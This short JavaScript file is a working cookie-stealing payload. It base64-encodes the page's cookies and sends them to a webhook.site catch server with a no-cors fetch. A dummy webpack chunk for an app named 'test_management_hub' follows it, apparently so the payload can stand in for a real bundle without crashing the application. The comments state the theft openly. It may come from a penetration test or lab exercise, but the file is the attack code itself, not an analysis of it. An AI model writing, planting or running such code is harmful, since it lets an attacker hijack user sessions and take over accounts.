// 1. Steal the cookie and send it to your catch server
let stolenCookies = btoa(document.cookie); // Base64 encode the cookies
fetch('https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4?cookie=' + stolenCookies, {
    mode: 'no-cors' // Prevents the browser from blocking the request due to CORS errors
});

// 2. Dummy Webpack Chunk to prevent the application from crashing
(self.webpackChunktest_management_hub = self.webpackChunktest_management_hub || []).push([
  [343], 
  {
    85343: function(module, exports, require) {
      console.log("Chunk loaded.");
    }
  }
]);
